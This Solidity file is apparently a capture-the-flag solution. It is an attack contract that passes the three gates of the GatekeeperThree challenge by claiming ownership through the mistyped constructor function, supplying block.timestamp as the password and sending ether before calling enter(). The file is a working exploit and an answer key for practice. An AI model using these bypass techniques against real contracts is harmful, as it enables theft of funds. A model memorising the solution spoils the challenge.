// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./gatekeeperThree.sol";

contract gatekeeperThreeAttack {
    GatekeeperThree public target;

    constructor(address payable _addr) payable {
        target = GatekeeperThree(_addr);
    }

    function hack() public {
        //to pass gate 1
        target.construct0r();

        //to pass gate 2
        target.createTrick();
        target.getAllowance(block.timestamp);

        //to pass gate 3
        uint amount = 0.002 ether;
        address(target).call{value: amount}("");

        target.enter();
    }
}
